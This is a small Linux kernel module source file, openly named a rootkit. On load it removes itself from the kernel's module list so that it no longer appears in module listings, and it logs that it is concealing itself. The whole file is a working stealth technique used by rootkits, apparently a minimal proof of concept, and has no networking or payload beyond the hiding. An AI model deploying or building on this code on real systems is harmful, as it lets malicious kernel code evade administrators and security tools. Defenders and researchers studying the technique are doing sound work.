#include <linux/module.h>
#include <linux/kernel.h>


static int __init rootkit_init(void)
{
    printk("module_hidder[conceal itselfs]: loaded");
    list_del_init(&THIS_MODULE->list);
    return 0;
}

static void __exit rootkit_exit(void)
{
    printk("module_hidder: exited");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");